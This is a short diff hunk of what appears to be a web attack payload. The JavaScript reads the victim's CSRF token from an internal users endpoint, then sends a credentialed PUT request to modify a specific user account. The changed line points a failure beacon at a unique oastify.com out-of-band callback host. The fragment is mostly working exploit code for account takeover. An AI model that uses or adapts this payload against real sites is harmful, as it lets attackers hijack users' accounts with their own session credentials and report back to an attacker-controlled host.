@@ -6,7 +6,7 @@ fetch('/web/internal/v1/users/current', {
         d = JSON.parse(t)
     } catch (e) {}
     let c = d.csrfToken || d.token || d.data?.csrfToken;
-    if (!c) return fetch('//oastify.com/log?e=1');
+    if (!c) return fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?e=1');
     fetch('/web/api2/v3/users/yD6g4rpcvcbp9JCazqrxk1', {
         method: 'PUT',
         credentials: 'include',
